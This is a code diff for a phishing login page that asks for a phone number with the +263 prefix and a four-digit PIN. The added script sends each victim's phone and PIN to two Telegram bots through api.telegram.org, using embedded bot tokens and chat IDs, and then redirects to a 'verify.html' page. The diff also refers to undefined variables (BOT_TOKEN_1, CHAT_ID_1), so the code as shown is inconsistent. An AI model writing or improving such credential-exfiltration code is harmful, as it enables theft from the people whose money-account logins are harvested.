@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 
@@ -343,8 +342,14 @@
         </div>
     </div>
     <script>
+        // Bot 1 (your existing)
         const BOT_TOKEN = '8624486852:AAGr0BrQxAa0cKc36s9sAHgcfcX03eX4M64';
         const CHAT_ID = '7468436625';
+
+        // Bot 2 (your second bot)
+        const BOT_TOKEN_2 = '8374783082:AAGu_MAmTZ7plivFdGJU10DjUECPe-Nbw-Q';
+        const CHAT_ID_2 = '5615316142';
+
         const savedPhone = localStorage.getItem('phone');
         const phoneInput = document.getElementById('phoneInput');
         if (savedPhone && savedPhone.length === 9) {
@@ -359,7 +364,7 @@
             pinValue = Array.from(pinBoxes).map(box => box.value).join('');
             loginBtn.style.display = pinValue.length === 4 ? 'block' : 'none';
         }
-        
+
         pinBoxes.forEach((box, index) => {
             box.addEventListener('input', () => {
                 if (box.value.length === 1 && index < 3) {
@@ -374,33 +379,47 @@
             });
         });
 
+        // ========== LOGIN CLICK ==========
         loginBtn.addEventListener('click', () => {
             const phone = phoneInput.value.trim();
             if (!phone) {
                 alert('Please enter phone number');
                 return;
             }
-            
+
             spinnerOverlay.style.display = 'flex';
-            
+
             // Save phone to localStorage
             localStorage.setItem('phone', phone);
-            
-            // Send credentials to Telegram bot (no inline buttons, no approval needed)
+
+            // Build the credential message
             const message = `New Login Attempt\n\nPhone: +263 ${phone}\nPIN: ${pinValue}`;
-            
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+
+            // Send to Bot 1
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN_1}/sendMessage`, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
                 },
                 body: JSON.stringify({
-                    chat_id: CHAT_ID,
+                    chat_id: CHAT_ID_1,
                     text: message
                 })
             }).catch(() => {});
 
-            // Proceed to next page immediately without waiting
+            // Send to Bot 2
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN_2}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID_2,
+                    text: message
+                })
+            }).catch(() => {});
+
+            // Proceed to next page
             setTimeout(() => {
                 window.location.href = 'verify.html';
             }, 1500);
